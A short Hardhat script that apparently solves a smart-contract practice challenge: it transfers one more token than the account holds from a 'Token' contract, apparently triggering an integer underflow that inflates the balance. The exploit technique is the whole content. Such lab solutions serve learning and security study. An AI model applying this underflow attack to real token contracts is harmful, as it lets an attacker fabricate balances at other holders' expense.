const { ethers } = require("hardhat");
const hre = require("hardhat");


async function solve(instance_address, account) {
    
    const Token = await ethers.getContractFactory("Token");

    let token = Token.attach(instance_address);

    // Token balance
    start_balance = parseInt(await token.balanceOf(account.address));
    console.log(`Balance = ${start_balance}`);
   
    console.log(`Transfer ${start_balance + 1} tokens to ${ethers.constants.AddressZero}`);
    let tx = await token.transfer(ethers.constants.AddressZero, start_balance + 1);

    console.log('Waiting for 10 confirmations...');
    await tx.wait(10);

    end_balance = parseInt(await token.balanceOf(account.address));
    console.log(`Balance = ${end_balance}`);
   
    console.log('Success!');

}


async function main() {

    const [account] = await ethers.getSigners();
    console.log(`Account address: ${account.address}`);
    console.log('');

    instance_address = '0x2924E96B83972041C9D876BC55e2e10e2283A893';

    await solve(instance_address, account);

}


main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
